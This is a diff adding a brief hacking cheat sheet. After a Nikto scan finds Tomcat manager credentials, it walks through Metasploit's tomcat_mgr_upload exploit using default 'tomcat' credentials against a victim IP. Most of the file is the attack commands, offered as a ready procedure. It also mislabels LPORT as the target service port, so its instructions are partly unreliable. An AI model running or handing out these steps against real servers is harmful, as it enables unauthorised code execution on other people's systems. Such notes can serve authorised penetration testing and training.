@@ -1,0 +1,17 @@
+: Web service hacking :
+: After nkito scan if any vulnerability found we can expoit that vulnerability using metasploit :
+//in this case tomcat manager credential FOUND!!
+
+EITHER 
+: Enter the site through credentials :
+OR
+: Exploit Vulnerability using msfconsole :
+
+use exploit/multi/http/tomcat_mgr_upload 
+set HttpPassword tomcat
+set HttpUsername tomcat 
+set Rhost [victim's ip]
+set Lport [port on which service is running]
+run
+
+ 
